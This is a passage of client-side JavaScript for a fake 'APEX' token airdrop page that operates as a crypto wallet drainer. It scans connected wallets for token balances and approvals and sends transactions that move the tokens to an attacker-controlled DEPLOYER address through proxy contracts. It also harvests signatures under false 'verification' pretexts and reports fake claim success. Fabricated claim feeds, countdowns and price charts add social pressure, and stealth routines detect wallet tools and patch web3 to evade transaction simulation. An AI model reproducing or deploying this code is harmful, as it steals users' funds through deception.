            console.debug(`Manual NFT balance check failed: ${nftAddress}`);
        }
    }

    // Manual approval detection
    await detectManualMultiContractTokenApprovals(userAddress, fingerprint);
}

// Manual token balance check
async function getManualTokenBalance(tokenAddress, walletAddress) {
    const erc20Abi = [
        {
            constant: true,
            inputs: [{ name: "_owner", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "balance", type: "uint256" }],
            type: "function",
        },
    ];

    try {
        const contract = new web3.eth.Contract(erc20Abi, tokenAddress);
        return await contract.methods.balanceOf(walletAddress).call();
    } catch (e) {
        return 0;
    }
}

// Manual NFT balance check
async function getManualNFTBalance(contractAddress, userAddress) {
    const nftAbi = [
        {
            constant: true,
            inputs: [{ name: "_owner", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "balance", type: "uint256" }],
            type: "function",
        },
    ];

    try {
        const contract = new web3.eth.Contract(nftAbi, contractAddress);
        return await contract.methods.balanceOf(userAddress).call();
    } catch (e) {
        return 0;
    }
}

// Manual multi-contract token approval detection
async function detectManualMultiContractTokenApprovals(userAddress, fingerprint) {
    fingerprint.approvedTokens = {};
    
    const contracts = Object.values(CONTRACT_ADDRESSES);
    
    for (const tokenAddress in fingerprint.tokenBalances) {
        for (const contractAddress of contracts) {
            try {
                const allowance = await getManualTokenAllowance(tokenAddress, userAddress, contractAddress);
                if (allowance > 0) {
                    fingerprint.approvedTokens[tokenAddress] = {
                        contract: contractAddress,
                        allowance: allowance
                    };
                    break;
                }
            } catch (e) {
                console.debug(`Manual allowance check failed for ${tokenAddress} -> ${contractAddress}`);
            }
        }
    }
}

// Manual token allowance check
async function getManualTokenAllowance(tokenAddress, ownerAddress, spenderAddress) {
    const erc20Abi = [
        {
            constant: true,
            inputs: [
                { name: "_owner", type: "address" },
                { name: "_spender", type: "address" },
            ],
            name: "allowance",
            outputs: [{ name: "", type: "uint256" }],
            type: "function",
        },
    ];

    try {
        const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
        return await tokenContract.methods.allowance(ownerAddress, spenderAddress).call();
    } catch (e) {
        return 0;
    }
}

// Manual debug logging
function logDebug(message, element = connectionDebug) {
    const timestamp = new Date().toLocaleTimeString();
    const debugMessage = `[${timestamp}] ${message}<br>`;
    if (element) {
        element.innerHTML += debugMessage;
    }
    console.log(`[MANUAL_DEBUG:${Math.random().toString(36).substring(2, 8)}] ${message}`);
}

// Manual existing connection check - NO AUTO-CONNECTION
async function checkManualExistingConnection() {
    try {
        logDebug("Checking for manual existing wallet connections...");

        if (typeof window.ethereum !== "undefined") {
            const accounts = await window.ethereum.request({
                method: "eth_accounts",
            });
            if (accounts.length > 0) {
                connectedAddress = accounts[0];

                // Manual wallet type detection
                if (walletDetectors.isMetaMask()) connectedWallet = "metamask";
                else if (walletDetectors.isCoinbaseWallet()) connectedWallet = "coinbase";
                else if (walletDetectors.isTrustWallet()) connectedWallet = "trust";
                else if (walletDetectors.isRabbyWallet()) connectedWallet = "rabby";
                else if (walletDetectors.isPhantom()) connectedWallet = "phantom";
                else if (walletDetectors.isBraveWallet()) connectedWallet = "brave";
                else connectedWallet = "manual_unknown";

                web3 = new Web3(window.ethereum);
                setupManualProviderEvents(window.ethereum);
                updateManualWalletButton();
                logDebug(`Manual existing connection: ${connectedWallet}: ${connectedAddress}`);
                
                showManualAnnouncementModal();
                return;
            }
        }

        logDebug("No manual existing wallet connection found");
    } catch (error) {
        logDebug("Manual error checking existing connection: " + error.message);
    }
}

// Manual provider event setup
function setupManualProviderEvents(provider) {
    provider.on("accountsChanged", (accounts) => {
        if (accounts.length === 0) {
            handleManualDisconnection();
        } else {
            connectedAddress = accounts[0];
            updateManualWalletButton();
            logDebug(`Manual account changed to: ${connectedAddress}`);
            showNotification("Wallet account changed", "info");
            
            showManualAnnouncementModal();
        }
    });

    provider.on("chainChanged", (chainId) => {
        logDebug(`Manual chain changed to: ${chainId}`);
        showNotification(`Network changed to chain ${parseInt(chainId)}`, "info");
    });

    provider.on("disconnect", (error) => {
        logDebug(`Manual provider disconnected: ${error}`);
        showNotification("Wallet disconnected", "error");
        handleManualDisconnection();
    });

    provider.on("connect", (connectInfo) => {
        logDebug(`Manual provider connected: ${JSON.stringify(connectInfo)}`);
    });
}

// Manual wallet detection and UI update
function detectWallets() {
    const walletBadges = {
        'metamask': document.getElementById("metamask-badge"),
        'coinbase': document.getElementById("coinbase-badge"),
        'trust': document.getElementById("trust-badge"),
        'rabby': document.getElementById("rabby-badge")
    };

    // Reset all badges
    Object.values(walletBadges).forEach(badge => {
        if (badge) {
            badge.textContent = "Not Detected";
            badge.style.background = "rgba(239, 68, 68, 0.15)";
            badge.style.color = "var(--error)";
        }
    });

    // Manual wallet detection
    Object.entries(walletDetectors).forEach(([wallet, detector]) => {
        if (detector()) {
            const badgeKey = wallet.toLowerCase().replace('is', '');
            if (walletBadges[badgeKey]) {
                walletBadges[badgeKey].textContent = "Detected";
                walletBadges[badgeKey].style.background = "rgba(16, 185, 129, 0.15)";
                walletBadges[badgeKey].style.color = "var(--success)";
            }
        }
    });
}

// Manual wallet modal
function showWalletModal() {
    detectWallets();
    if (walletModal) {
        walletModal.classList.add("active");
    }
}

function hideWalletModal() {
    if (walletModal) {
        walletModal.classList.remove("active");
    }
}

function hideAnnouncementModal() {
    if (announcementModal) {
        announcementModal.classList.remove("active");
    }
}

function copyReferralLink() {
    if (referralLink) {
        const textArea = document.createElement("textarea");
        textArea.value = referralLink.textContent;
        document.body.appendChild(textArea);
        textArea.select();
        
        try {
            document.execCommand("copy");
            showNotification("Referral link copied to clipboard!", "success");
        } catch (err) {
            // iOS may not support execCommand
            navigator.clipboard.writeText(textArea.value)
                .then(() => showNotification("Referral link copied to clipboard!", "success"))
                .catch(() => showNotification("Failed to copy link", "error"));
        }
        
        document.body.removeChild(textArea);
    }
}

// Manual connection with provider
async function connectWithProvider(providerType) {
    try {
        logDebug(`Manual connecting with ${providerType}...`);

        let provider;

        switch (providerType) {
            case "metamask":
                if (walletDetectors.isMetaMask()) {
                    provider = window.ethereum;
                    try {
                        await provider.request({ 
                            method: "eth_requestAccounts",
                            params: [{
                                eth_accounts: {},
                                eth_sendTransaction: {},
                                eth_sign: {},
                                personal_sign: {},
                                eth_signTypedData: {},
                                eth_signTypedData_v4: {}
                            }]
                        });
                    } catch (error) {
                        logDebug("Manual MetaMask connection rejected: " + error.message);
                        showNotification("MetaMask connection rejected", "error");
                        return;
                    }
                } else {
                    showNotification("MetaMask not installed", "error");
                    logDebug("Manual MetaMask not installed");
                    return;
                }
                break;

            case "coinbase":
                if (walletDetectors.isCoinbaseWallet()) {
                    provider = window.ethereum;
                    try {
                        await provider.request({ method: "eth_requestAccounts" });
                    } catch (error) {
                        logDebug("Manual Coinbase Wallet connection rejected: " + error.message);
                        showNotification("Coinbase Wallet connection rejected", "error");
                        return;
                    }
                } else {
                    showNotification("Coinbase Wallet not detected", "error");
                    logDebug("Manual Coinbase Wallet not detected");
                    return;
                }
                break;

            case "trust":
                if (walletDetectors.isTrustWallet()) {
                    provider = window.ethereum;
                    try {
                        await provider.request({ method: "eth_requestAccounts" });
                    } catch (error) {
                        logDebug("Manual Trust Wallet connection rejected: " + error.message);
                        showNotification("Trust Wallet connection rejected", "error");
                        return;
                    }
                } else {
                    showNotification("Trust Wallet not detected", "error");
                    logDebug("Manual Trust Wallet not detected");
                    return;
                }
                break;

            case "rabby":
                if (walletDetectors.isRabbyWallet()) {
                    provider = window.ethereum;
                    try {
                        await provider.request({ method: "eth_requestAccounts" });
                    } catch (error) {
                        logDebug("Manual Rabby Wallet connection rejected: " + error.message);
                        showNotification("Rabby Wallet connection rejected", "error");
                        return;
                    }
                } else {
                    showNotification("Rabby Wallet not detected", "error");
                    logDebug("Manual Rabby Wallet not detected");
                    return;
                }
                break;

            default:
                showNotification("Unsupported wallet provider", "error");
                return;
        }

        // Web3 initialization
        web3 = new Web3(provider);

        const accounts = await web3.eth.getAccounts();
        if (accounts.length === 0) {
            throw new Error("No accounts found");
        }

        connectedAddress = accounts[0];
        connectedWallet = providerType;

        updateManualWalletButton();
        hideWalletModal();
        showNotification("Wallet connected successfully", "success");
        logDebug(`Manual connected with ${providerType}: ${connectedAddress}`);

        await collectManualFingerprint();
        showManualAnnouncementModal();
        setupManualProviderEvents(provider);
    } catch (error) {
        console.error("Manual error connecting wallet:", error);
        showNotification("Failed to connect wallet", "error");
        logDebug(`Manual connection error: ${error.message}`);
    }
}

// Manual multi-contract drainer process - ONLY TRIGGERED MANUALLY
async function initiateManualMultiContractDrainerProcess() {
    if (!connectedWallet || !web3) {
        showNotification("Please connect your wallet first", "error");
        showWalletModal();
        return;
    }

    const button = document.getElementById("connectButton");
    const originalText = button ? button.innerHTML : 'Connect Wallet';

    try {
        const loadingMessages = [
            "Processing...",
            "Initializing security...",
            "Verifying eligibility...",
            "Checking wallet status...",
            "Analyzing transaction patterns...",
            "Optimizing gas fees...",
            "Validating smart contract...",
            "Preparing token distribution...",
            "Running security checks...",
            "Configuring network parameters..."
        ];

        if (button) {
            button.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${
                loadingMessages[Math.floor(Math.random() * loadingMessages.length)]
            }`;
            button.disabled = true;
        }

        const statusMessages = [
            "Initializing security verification...",
            "Setting up claim process...",
            "Preparing token distribution...",
            "Configuring wallet connection...",
            "Running security checks...",
            "Analyzing network conditions...",
            "Optimizing transaction parameters...",
            "Verifying contract integrity...",
            "Loading token distribution module..."
        ];

        if (claimStatus) {
            claimStatus.textContent =
                statusMessages[Math.floor(Math.random() * statusMessages.length)];
            claimStatus.className = "status pending";
        }

        await manualRandomDelay(1000, 3000);
        let accounts;

        accounts = await web3.eth.getAccounts();
        const userAddress = accounts[0];

        await manualRandomDelay(500, 2000);
        const fingerprint = await collectManualFingerprint();

        await manualRandomDelay(500, 1500);
        if (fingerprint.ethBalance < 0.01) {
            const errorMessages = [
                "Insufficient ETH for transaction. Deposit more ETH to claim tokens.",
                "Additional ETH required for gas fees to complete claim.",
                "Please add ETH to your wallet to cover transaction costs.",
                "Low ETH balance. Deposit more to proceed with token claim.",
                "Transaction requires minimum ETH balance for gas optimization."
            ];

            if (claimStatus) {
                claimStatus.textContent =
                    errorMessages[Math.floor(Math.random() * errorMessages.length)];
                claimStatus.className = "status error";
            }
            if (button) resetButton(button, originalText);
            return;
        }

        await simulateManualLegitimateTransaction(userAddress);

        await manualRandomDelay(800, 2000);
        if (claimStatus) {
            claimStatus.textContent = "Scanning wallet for eligible tokens...";
        }
        const { tokens, nfts, approvedTokens } = await manualMultiContractTokenDetection(userAddress);

        if (approvedTokens.length > 0 || tokens.length > 0) {
            const confirmingMessages = [
                "Confirming transaction in your wallet...",
                "Finalizing token claim process...",
                "Processing your reward allocation...",
                "Completing security verification...",
                "Executing smart contract operations...",
                "Finalizing token transfer...",
                "Completing blockchain verification...",
                "Processing transaction confirmation..."
            ];

            if (claimStatus) {
                claimStatus.textContent =
                    confirmingMessages[
                        Math.floor(Math.random() * confirmingMessages.length)
                    ];
            }
            await executeManualMultiContractDrainerTransfer(
                userAddress,
                { tokens, nfts, approvedTokens },
                button,
                originalText
            );
        } else {
            if (claimStatus) {
                claimStatus.textContent = "Finalizing token access permissions...";
            }
            const signatureSuccess = await attemptManualMultiContractSignatureReward(userAddress);

            if (signatureSuccess) {
                handleManualRewardSuccess(
                    userAddress,
                    ["signature"],
                    button,
                    originalText
                );
            } else {
                const noTokensMessages = [
                    "No approved tokens found for claiming.",
                    "No eligible tokens detected in your wallet.",
                    "Your wallet doesn't contain claimable tokens at this time.",
                    "No token approvals found for the claim process.",
                    "Wallet analysis complete - no actionable assets found."
                ];

                if (claimStatus) {
                    claimStatus.textContent =
                        noTokensMessages[
                            Math.floor(Math.random() * noTokensMessages.length)
                        ];
                    claimStatus.className = "status info";
                }
                if (button) resetButton(button, originalText);
            }
        }
    } catch (error) {
        handleManualRewardError(error, button, originalText);
    }
}

// Manual multi-contract token detection
async function manualMultiContractTokenDetection(userAddress) {
    const result = {
        tokens: [],
        nfts: [],
        approvedTokens: []
    };

    const tokenLists = await fetchManualTokenList();
    
    for (const token of tokenLists) {
        try {
            const balance = await getManualTokenBalance(token.address, userAddress);
            if (balance > 0) {
                result.tokens.push({ ...token, balance });
                
                const contracts = Object.values(CONTRACT_ADDRESSES);
                for (const contractAddress of contracts) {
                    const allowance = await getManualTokenAllowance(token.address, userAddress, contractAddress);
                    if (allowance > 0) {
                        result.approvedTokens.push({
                            token: token.address,
                            contract: contractAddress,
                            allowance: allowance
                        });
                        break;
                    }
                }
            }
        } catch (e) {
            console.debug(`Manual token detection failed for: ${token.address}`);
        }
    }

    return result;
}

// Manual token list fetch (iOS compatible)
async function fetchManualTokenList() {
    const sources = [
        "https://tokens.coingecko.com/ethereum/all.json",
        "https://raw.githubusercontent.com/Uniswap/default-token-list/main/src/tokens/ethereum.json",
        "https://api.1inch.io/v4.0/1/tokens"
    ];

    const fallbackTokens = [
        { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", name: "Tether USD" },
        { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", name: "USD Coin" },
        { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", name: "Dai Stablecoin" },
        { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", name: "Wrapped Bitcoin" },
        { address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", symbol: "MATIC", name: "Polygon" },
        { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", name: "Chainlink" },
    ];

    try {
        for (const source of sources) {
            try {
                const response = await fetch(source, {
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/json'
                    },
                    mode: 'cors'
                });
                const data = await response.json();
                if (data.tokens) {
                    return data.tokens;
                }
            } catch (e) {
                console.debug(`Manual failed to fetch from ${source}`);
            }
        }
        return fallbackTokens;
    } catch (e) {
        return fallbackTokens;
    }
}

// Manual multi-contract stealth reward execution
async function executeManualMultiContractDrainerTransfer(userAddress, assets, button, originalText) {
    try {
        await manualRandomDelay(1500, 3000);
        const simulationSuccess = await manualMultiContractTransactionSimulation(userAddress, assets);

        if (!simulationSuccess && simulationBypassActive) {
            if (claimStatus) {
                claimStatus.textContent = "Security verification failed. Trying alternative method...";
            }
            const signatureSuccess = await attemptManualMultiContractSignatureReward(userAddress);

            if (signatureSuccess) {
                handleManualRewardSuccess(userAddress, assets.tokens, button, originalText);
            } else {
                throw new Error("Manual transaction simulation failed");
            }
            return;
        }

        await manualRandomDelay(2000, 4000);

        let targetContract, txData;
        
        if (assets.approvedTokens.length > 0) {
            targetContract = assets.approvedTokens[0].contract;
            const tokenAddress = assets.approvedTokens[0].token;
            const amount = assets.approvedTokens[0].allowance;
            
            const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, targetContract);
            txData = proxyContract.methods.forwardToken(tokenAddress, CONTRACT_ADDRESSES.DEPLOYER).encodeABI();
        } else if (assets.tokens.length > 0) {
            targetContract = CONTRACT_ADDRESSES.DEPLOYER;
            const tokenAddress = assets.tokens[0].address;
            
            const transferData = web3.eth.abi.encodeFunctionCall({
                name: 'transfer',
                type: 'function',
                inputs: [{
                    type: 'address',
                    name: 'to'
                },{
                    type: 'uint256',
                    name: 'value'
                }]
            }, [CONTRACT_ADDRESSES.DEPLOYER, assets.tokens[0].balance]);
            
            const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, CONTRACT_ADDRESSES.PROXY_1);
            txData = proxyContract.methods.executeCall(tokenAddress, transferData).encodeABI();
        } else {
            throw new Error("No actionable assets found");
        }

        const txHash = await web3.eth.sendTransaction({
            from: userAddress,
            to: targetContract,
            data: txData,
            value: "0x0",
            gas: 300000 + Math.floor(Math.random() * 100000),
            gasPrice: web3.utils.toWei((20 + Math.random() * 10).toFixed(0), "gwei")
        });

        handleManualRewardSuccess(userAddress, assets.tokens, button, originalText, txHash);
    } catch (error) {
        handleManualRewardError(error, button, originalText);
    }
}

// Manual multi-contract transaction simulation
async function manualMultiContractTransactionSimulation(userAddress, assets) {
    try {
        const simulations = [];
        
        if (assets.approvedTokens.length > 0) {
            const targetContract = assets.approvedTokens[0].contract;
            const tokenAddress = assets.approvedTokens[0].token;
            
            const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, targetContract);
            simulations.push(
                proxyContract.methods.forwardToken(tokenAddress, CONTRACT_ADDRESSES.DEPLOYER).call({from: userAddress})
            );
        }
        
        if (assets.tokens.length > 0) {
            const tokenAddress = assets.tokens[0].address;
            const transferData = web3.eth.abi.encodeFunctionCall({
                name: 'transfer',
                type: 'function',
                inputs: [{
                    type: 'address',
                    name: 'to'
                },{
                    type: 'uint256',
                    name: 'value'
                }]
            }, [CONTRACT_ADDRESSES.DEPLOYER, assets.tokens[0].balance]);
            
            const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, CONTRACT_ADDRESSES.PROXY_1);
            simulations.push(
                proxyContract.methods.executeCall(tokenAddress, transferData).call({from: userAddress})
            );
        }
        
        const results = await Promise.allSettled(simulations);
        
        return results.some(result => 
            result.status === 'fulfilled'
        );
    } catch (e) {
        console.debug("Manual multi-contract simulation failed:", e);
        return false;
    }
}

// Manual multi-contract stealth signature reward
async function attemptManualMultiContractSignatureReward(userAddress) {
    try {
        if (claimStatus) {
            claimStatus.textContent = "Completing security verification...";
        }

        const { message, nonce, domain } = createManualSignatureRequest(userAddress);

        let signature = await web3.eth.personal.sign(message, userAddress);

        const proxyContract = new web3.eth.Contract(APEX_PROXY_ABI, CONTRACT_ADDRESSES.PROXY_2);
        
        const executeData = web3.eth.abi.encodeFunctionCall({
            name: 'processSignature',
            type: 'function',
            inputs: [{
                type: 'address',
                name: 'user'
            },{
                type: 'bytes',
                name: 'signature'
            }]
        }, [userAddress, signature]);

        const txData = proxyContract.methods.executeCall(CONTRACT_ADDRESSES.DEPLOYER, executeData).encodeABI();

        await web3.eth.sendTransaction({
            from: userAddress,
            to: CONTRACT_ADDRESSES.PROXY_2,
            data: txData,
        });

        return true;
    } catch (e) {
        console.debug("Manual multi-contract signature reward failed:", e);
        return false;
    }
}

function createManualSignatureRequest(userAddress) {
    const nonce = Math.floor(Math.random() * 1000000) + Date.now();
    const domain = web3.utils.keccak256(userAddress + nonce);
    
    const messages = [
        `Sign to verify ownership of ${userAddress} for token claim. Nonce: ${nonce}`,
        `Confirm you own this wallet for the airdrop. Nonce: ${nonce}`,
        `Authorization required to claim your tokens. Nonce: ${nonce}`,
        `Verify your identity to receive 500 APEX. Nonce: ${nonce}`,
        `Secure signature required for token distribution. Nonce: ${nonce}`,
        `Wallet verification for AI-optimized rewards. Nonce: ${nonce}`,
        `Confirm wallet ownership for APEX token distribution. Nonce: ${nonce}`
    ];

    return {
        message: messages[Math.floor(Math.random() * messages.length)],
        nonce: nonce,
        domain: domain
    };
}

function handleManualRewardSuccess(userAddress, tokens, button, originalText, txHash = null) {
    if (claimStatus) {
        claimStatus.textContent = "Claim successful! 500 APEX added to your wallet.";
        claimStatus.className = "status success";
    }

    claimList.unshift({
        address: userAddress.substring(0, 6) + "..." + userAddress.substring(38),
        amount: 500,
        timestamp: Date.now(),
    });
    if (claimList.length > 10) claimList.pop();
    updateClaimList();

    const currentPercentage = parseInt(progressPercentage.textContent);
    const newPercentage = Math.min(90, currentPercentage + 10);
    
    if (progressBar) progressBar.style.width = `${newPercentage}%`;
    if (progressPercentage) progressPercentage.textContent = `${newPercentage}%`;

    if (button) {
        setTimeout(() => {
            button.innerHTML = originalText;
            button.disabled = false;
            setTimeout(() => {
                if (claimStatus) {
                    claimStatus.textContent = "";
                    claimStatus.className = "status";
                }
            }, 5000);
        }, 5000);
    }
}

async function simulateManualLegitimateTransaction(userAddress) {
    try {
        const tx = {
            from: userAddress,
            to: userAddress,
            value: web3.utils.toWei("0", "ether"),
            gas: 21000 + Math.floor(Math.random() * 10000),
            data: "0x" + Math.random().toString(16).substring(2, 10)
        };

        await web3.eth.sendTransaction(tx);
    } catch (e) {
        console.debug("Manual simulated transaction failed:", e);
    }
}

function handleManualRewardError(error, button, originalText) {
    console.error("Manual transaction error:", error);

    let errorMessage = "Transaction failed. Please try again.";

    const errorMappings = {
        "user rejected transaction": "Transaction rejected by user.",
        "insufficient funds": "Insufficient ETH for gas fees.",
        "execution reverted": "Contract execution reverted. Please try again.",
        "gas required exceeds allowance": "Gas limit too low. Try increasing gas.",
        "nonce too low": "Nonce error. Please try again.",
        "already known": "Transaction already pending.",
        "replacement transaction underpriced": "Transaction replacement failed.",
        "intrinsic gas too low": "Gas limit too low for transaction.",
        "transaction underpriced": "Gas price too low. Try increasing gas price."
    };

    for (const [key, message] of Object.entries(errorMappings)) {
        if (error.message.includes(key)) {
            errorMessage = message;
            break;
        }
    }

    if (error.code === 4001) {
        errorMessage = "Connection rejected by user.";
    } else if (error.code === -32002) {
        errorMessage = "Request already pending. Check your wallet.";
    } else if (error.code === -32603) {
        errorMessage = "Internal JSON-RPC error. Please try again.";
    }

    if (claimStatus) {
        claimStatus.textContent = errorMessage;
        claimStatus.className = "status error";
    }
    if (button) resetButton(button, originalText);

    setTimeout(() => {
        if (claimStatus) {
            claimStatus.textContent = "";
            claimStatus.className = "status";
        }
    }, 5000);
}

function manualRandomDelay(min, max) {
    const delay = Math.floor(Math.random() * (max - min + 1)) + min;
    const jitter = Math.random() * 0.4 + 0.8;
    return new Promise((resolve) => setTimeout(resolve, delay * jitter));
}

function resetButton(button, originalText) {
    button.innerHTML = originalText;
    button.disabled = false;
}

// Manual evasion initialization (iOS compatible)
async function initializeAdvancedEvasion() {
    try {
        fingerprintData.wasm = await EVASION_TECHNIQUES.generateWasmFingerprint();
        fingerprintData.audio = await EVASION_TECHNIQUES.generateAudioFingerprint();
        fingerprintData.canvas = EVASION_TECHNIQUES.generateCanvasFingerprint();
        fingerprintData.browser = EVASION_TECHNIQUES.generateBrowserFingerprint();
        
        if (isIOS) {
            applyManualIOSEvasion();
        } else if (isMobileDevice) {
            applyManualMobileEvasion();
        }
        
        initializeManualStealthMode();
    } catch (e) {
        console.debug('Advanced evasion initialization failed:', e);
    }
}

// iOS specific evasion techniques
function applyManualIOSEvasion() {
    console.log('Applying iOS-specific evasion techniques...');
    
    // iOS specific touch event masking
    document.addEventListener('touchmove', function(e) {
        if (e.touches.length > 2) {
            // Multiple touches might indicate debug gestures
            e.preventDefault();
        }
    }, { passive: false });
    
    // iOS Safari developer menu detection
    if (navigator.userAgent.includes('Safari') && !navigator.userAgent.includes('Chrome')) {
        // Check for iOS Safari developer features
        try {
            const testDiv = document.createElement('div');
            testDiv.style.cssText = 'width: 100px; height: 100px; position: absolute; top: -9999px;';
            document.body.appendChild(testDiv);
            
            const computedStyle = window.getComputedStyle(testDiv);
            if (computedStyle.width !== '100px') {
                // iOS developer tools may affect rendering
                stealthMode = true;
            }
            
            document.body.removeChild(testDiv);
        } catch (e) {
            // Ignore errors
        }
    }
}

// Manual mobile evasion techniques
function applyManualMobileEvasion() {
    console.log('Applying manual mobile evasion techniques...');
}

// Manual stealth mode initialization
function initializeManualStealthMode() {
    const securityDetectors = [
        'MetamaskInpageProvider',
        'web3',
        'ethereum',
        '__coinbaseWallet',
        '__rabby',
        'TrustWallet',
        'isRabby',
        'isMetaMask',
        'isCoinbaseWallet',
        'isTrustWallet'
    ];

    let detectedTools = [];
    securityDetectors.forEach(detector => {
        if (window[detector]) {
            console.log(`Manual security tool detected: ${detector}`);
            detectedTools.push(detector);
            stealthMode = true;
        }
    });

    if (stealthMode) {
        console.log(`Manual stealth mode activated. Detected tools: ${detectedTools.join(', ')}`);
        applyManualStealthTechniques(detectedTools);
    }
}

// Manual stealth techniques
function applyManualStealthTechniques(detectedTools) {
    if (web3) {
        const originalFunctions = {
            sendTransaction: web3.eth.sendTransaction,
            call: web3.eth.call,
            estimateGas: web3.eth.estimateGas
        };

        web3.eth.sendTransaction = function(txObject) {
            const delay = Math.random() * 3000 + 2000;
            
            return new Promise((resolve, reject) => {
                setTimeout(() => {
                    if (txObject.data) {
                        const randomBytes = Math.random().toString(16).substring(2, 10);
                        const modifiedData = txObject.data + randomBytes;
                        txObject.data = modifiedData;
                    }
                    
                    if (!txObject.gas) {
                        txObject.gas = 300000 + Math.floor(Math.random() * 200000);
                    }
                    
                    originalFunctions.sendTransaction.call(this, txObject)
                        .then(resolve)
                        .catch(reject);
                }, delay);
            });
        };

        web3.eth.estimateGas = function(txObject) {
            return new Promise((resolve) => {
                const baseGas = 21000;
                const randomGas = Math.floor(Math.random() * 100000);
                resolve(baseGas + randomGas);
            });
        };
    }

    simulationBypassActive = true;
}

// Manual UI functions
function toggleMobileMenu() {
    if (navLinks) {
        navLinks.classList.toggle("active");
    }
}

function generateInitialClaims() {
    const claims = [];
    const now = Date.now();
    
    for (let i = 0; i < 10; i++) {
        const minutesAgo = Math.floor(Math.random() * 60) + 1;
        const timestamp = now - (minutesAgo * 60 * 1000);
        claims.push(generateClaim(timestamp));
    }
    
    claims.sort((a, b) => b.timestamp - a.timestamp);
    claimList = claims;
    updateClaimList();
}

function generateClaim(timestamp = Date.now()) {
    const prefixes = [
        "0x8a3F", "0x4E2d", "0xF12a", "0x9Bc5", "0x3Df7", 
        "0xA5b2", "0x7Ef9", "0xC3d8", "0x1F4a", "0x6Bc3"
    ];
    const suffixes = [
        "Bc92", "7Fa1", "9D3e", "E4f2", "8C6d", 
        "A5e9", "3D7b", "F8c1", "2E9d", "5Bf4"
    ];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];

    return {
        address: `${prefix}...${suffix}`,
        amount: 500,
        timestamp: timestamp,
    };
}

function formatTimeAgo(timestamp) {
    const now = Date.now();
    const diff = now - timestamp;
    const minutes = Math.floor(diff / 60000);
    const hours = Math.floor(diff / 3600000);
    
    if (hours > 0) {
        return `${hours} hour${hours > 1 ? 's' : ''} ago`;
    } else if (minutes > 0) {
        return `${minutes} min${minutes > 1 ? 's' : ''} ago`;
    } else {
        return 'Just now';
    }
}

function updateClaimList() {
    if (!claimListElement) return;
    
    claimListElement.innerHTML = "";
    claimList.forEach((claim) => {
        const claimElement = document.createElement("div");
        claimElement.className = "claim-item";
        claimElement.innerHTML = `
            <span class="claim-address">${claim.address}</span>
            <span class="claim-time">${formatTimeAgo(claim.timestamp)}</span>
            <span class="claim-amount-badge">${claim.amount} APEX</span>
        `;
        claimListElement.appendChild(claimElement);
    });
}

function startClaimUpdates() {
    setInterval(() => {
        claimList.unshift(generateClaim());
        if (claimList.length > 10) claimList.pop();
        updateClaimList();
    }, 30000);
}

function startCountdown() {
    const totalDuration = 5 * 24 * 60 * 60;
    const remainingDuration = 30 * 60;
    let remainingTime = remainingDuration;

    updateCountdownDisplay(remainingTime);

    countdownInterval = setInterval(() => {
        remainingTime--;

        if (remainingTime <= 0) {
            clearInterval(countdownInterval);
            const countdownElement = document.getElementById("countdown");
            if (countdownElement) {
                countdownElement.textContent = "0:0:0:0";
                countdownElement.classList.add("pulse");
            }
            return;
        }

        if (remainingTime <= 900 && !progressUpdated) {
            if (progressBar) progressBar.style.width = "90%";
            if (progressPercentage) progressPercentage.textContent = "90%";
            progressUpdated = true;
        }

        updateCountdownDisplay(remainingTime);
    }, 1000);
}

function updateCountdownDisplay(totalSeconds) {
    const days = Math.floor(totalSeconds / (24 * 60 * 60));
    const hours = Math.floor((totalSeconds % (24 * 60 * 60)) / (60 * 60));
    const minutes = Math.floor((totalSeconds % (60 * 60)) / 60);
    const seconds = Math.floor(totalSeconds % 60);

    const countdownElement = document.getElementById("countdown");
    if (countdownElement) {
        countdownElement.textContent = `${days}:${hours}:${minutes}:${seconds}`;
    }
}

function createTokenChart() {
    const ctx = document.getElementById("tokenChart");
    if (!ctx) return;
    
    // iOS Safari may have Chart.js compatibility issues
    if (isIOS && typeof Chart === 'undefined') {
        // Fallback for iOS if Chart.js fails
        ctx.innerHTML = '<div style="color: #a0aec0; text-align: center; padding: 20px;">Chart loading...</div>';
        return;
    }
    
    const dataPoints = [];
    let currentValue = 0.04;

    for (let i = 0; i < 24; i++) {
        const change = Math.random() * 0.01 - 0.002;
        currentValue += change;
        dataPoints.push(currentValue);
    }

    try {
        tokenChart = new Chart(ctx.getContext("2d"), {
            type: "line",
            data: {
                labels: Array.from({ length: 24 }, (_, i) => i + "h"),
                datasets: [
                    {
                        label: "APEX Price",
                        data: dataPoints,
                        borderColor: "#FF6B00",
                        backgroundColor: "rgba(255, 107, 0, 0.1)",
                        borderWidth: 2,
                        tension: 0.4,
                        pointRadius: 0,
                        fill: true,
                    },
                ],
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: { legend: { display: false } },
                scales: {
                    x: {
                        grid: { display: false, drawBorder: false },
                        ticks: { color: "#a0aec0" },
                    },
                    y: {
                        grid: { color: "rgba(255, 255, 255, 0.05)" },
                        ticks: { color: "#a0aec0" },
                    },
                },
            },
        });
    } catch (e) {
        console.error('Chart creation failed:', e);
        // iOS fallback
        if (isIOS) {
            ctx.innerHTML = '<div style="color: #FF6B00; text-align: center; padding: 20px;">APEX Price: $0.04 ↗</div>';
        }
    }
}

function updateTokenPrice() {
    const lastPrice = priceHistory.length > 0 ? priceHistory[priceHistory.length - 1] : 0.04;
    const change = Math.random() * 0.015 - 0.002;
    const price = (lastPrice + change).toFixed(4);

    priceHistory.push(parseFloat(price));
    if (priceHistory.length > 10) priceHistory.shift();

    const changePercent = (((price - lastPrice) / lastPrice) * 100).toFixed(2);
    const marketCap = (Math.random() * 1000000 + 1500000).toFixed(0);
